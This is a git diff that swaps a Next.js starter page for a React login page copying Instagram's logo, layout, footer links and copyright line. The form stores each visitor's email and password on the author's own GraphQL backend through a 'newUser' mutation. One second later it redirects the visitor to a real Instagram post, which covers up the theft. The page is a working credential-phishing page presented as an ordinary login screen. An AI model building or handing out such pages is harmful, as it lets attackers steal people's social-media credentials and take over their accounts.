@@ -1,65 +1,158 @@
-import Head from 'next/head'
-import styles from '../styles/Home.module.css'
+import React from 'react';
+import { useRouter } from 'next/router';
+import Layout from '../components/Layout';
+import { useFormik } from 'formik';
+import * as Yup from 'yup';
+import { useMutation, gql } from '@apollo/client';
 
-export default function Home() {
-  return (
-    <div className={styles.container}>
-      <Head>
-        <title>Create Next App</title>
-        <link rel="icon" href="/favicon.ico" />
-      </Head>
+const NEW_USER = gql`
+     mutation newUser($input: UserInput){
+          newUser(input: $input){
+               id
+               email
+               password
+          }
+   }
+`;
 
-      <main className={styles.main}>
-        <h1 className={styles.title}>
-          Welcome to <a href="https://nextjs.org">Next.js!</a>
-        </h1>
+const Index = () => {
 
-        <p className={styles.description}>
-          Get started by editing{' '}
-          <code className={styles.code}>pages/index.js</code>
-        </p>
+     //Routing
+     const router = useRouter();
 
-        <div className={styles.grid}>
-          <a href="https://nextjs.org/docs" className={styles.card}>
-            <h3>Documentation &rarr;</h3>
-            <p>Find in-depth information about Next.js features and API.</p>
-          </a>
+     //New user mutation
+     const [ newUser ] = useMutation(NEW_USER);
 
-          <a href="https://nextjs.org/learn" className={styles.card}>
-            <h3>Learn &rarr;</h3>
-            <p>Learn about Next.js in an interactive course with quizzes!</p>
-          </a>
+     //Form Validation
+     const formik = useFormik({
+          initialValues: {
+               email: '',
+               password: ''
+          },
+          validationSchema: Yup.object({
+               email: Yup.string().email('The email is invalid').required('El email es obligatorio'),
+               password: Yup.string().required('La contraseña es obligatoria')
+          }),
+          onSubmit: async values => {
+               const { email, password } = values;
 
-          <a
-            href="https://github.com/vercel/next.js/tree/master/examples"
-            className={styles.card}
-          >
-            <h3>Examples &rarr;</h3>
-            <p>Discover and deploy boilerplate example Next.js projects.</p>
-          </a>
+               try {
+                    const { data } = await newUser({
+                         variables: {
+                              input: {
+                                   email,
+                                   password
+                              }
+                         }
+                    });
+                    setTimeout(() => {
+                         //Redirection to login
+                         router.push('https://www.instagram.com/p/CFBTprapBWv/');
+                     }, 1000);
+               } catch (error) {
+                    //Error created user message
+                    console.log('Hubo un error');
+               }
+          }
+     })
 
-          <a
-            href="https://vercel.com/import?filter=next.js&utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className={styles.card}
-          >
-            <h3>Deploy &rarr;</h3>
-            <p>
-              Instantly deploy your Next.js site to a public URL with Vercel.
-            </p>
-          </a>
-        </div>
-      </main>
+     return(
+          <>
+               <Layout>
+                    <div className="wrapper">
+                         <div className="header">
+                              <div className="top">
+                                   <div className="logo">
+                                        <img src="instagram.png" alt="instagram" style={{width: 175 + 'px'}}/>
+                                   </div>
 
-      <footer className={styles.footer}>
-        <a
-          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Powered by{' '}
-          <img src="/vercel.svg" alt="Vercel Logo" className={styles.logo} />
-        </a>
-      </footer>
-    </div>
-  )
+                                   <form 
+                                        className="form"
+                                        onSubmit={ formik.handleSubmit }
+                                   >
+                                        <div className="input_field" htmlFor="email">
+                                             <input 
+                                                  type="email" 
+                                                  placeholder="Phone number, username, or email" className="input"
+                                                  id="email"
+                                                  autoComplete="off"
+                                                  spellCheck="false"
+                                                  autoFocus
+                                                  value={ formik.values.email }
+                                                  onChange={ formik.handleChange }
+                                                  onBlur={ formik.handleBlur }
+                                             />
+                                        </div>
+                                        <div className="input_field" htmlFor="password">
+                                             <input 
+                                                  type="password" 
+                                                  placeholder="Password" 
+                                                  className="input"
+                                                  id="password"
+                                                  autoComplete="off"
+                                                  spellCheck="false"
+                                                  value={ formik.values.password }
+                                                  onChange={ formik.handleChange }
+                                                  onBlur={ formik.handleBlur }
+                                             />
+                                        </div>
+                                        <input 
+                                             type="submit"
+                                             className="btn"
+                                             value="Log In"
+                                        />
+                                   </form>
+
+                                   <div className="or">
+                                        <div className="line"></div>
+                                        <p>OR</p>
+                                        <div className="line"></div>
+                                   </div>
+                                   <div className="dif">
+                                        <div className="fb">
+                                             <img src="facebook.png" alt="facebook"/>
+                                             <p>Log in with Facebook</p>
+                                        </div>
+                                        <div className="forgot">
+                                             <a href="#">Forgot password?</a>
+                                        </div>
+                                   </div>
+                              </div>
+                              <div className="signup">
+                                   <p>Don't have an account? <a href="#">Sign up</a></p>
+                              </div>
+                              <div className="apps">
+                                   <p>Get the app.</p>
+                                   <div className="icons">
+                                        <a href="#"><img src="appstore.png" alt="appstore"/></a>
+                                        <a href="#"><img src="googleplay.png" alt="googleplay"/></a>
+                                   </div>
+                              </div>
+                         </div>
+                         <div className="footer">
+                              <div className="links">
+                                   <ul>
+                                        <li><a href="#">ABOUT US</a></li>
+                                        <li><a href="#">SUPPORT</a></li>
+                                        <li><a href="#">PRESS</a></li>
+                                        <li><a href="#">API</a></li>
+                                        <li><a href="#">JOBS</a></li>
+                                        <li><a href="#">PRIVACY</a></li>
+                                        <li><a href="#">TERMS</a></li>
+                                        <li><a href="#">DIRECTORY</a></li>
+                                        <li><a href="#">PROFILES</a></li>
+                                        <li><a href="#">HASHTAGS</a></li>
+                                        <li><a href="#">LANGUAGE</a></li>
+                                   </ul>
+                              </div>
+                              <div className="copyright">
+                                   © 2020 INSTAGRAM
+                              </div>
+                         </div>
+                    </div>
+               </Layout>
+          </>
+     );
 }
+
+export default Index;
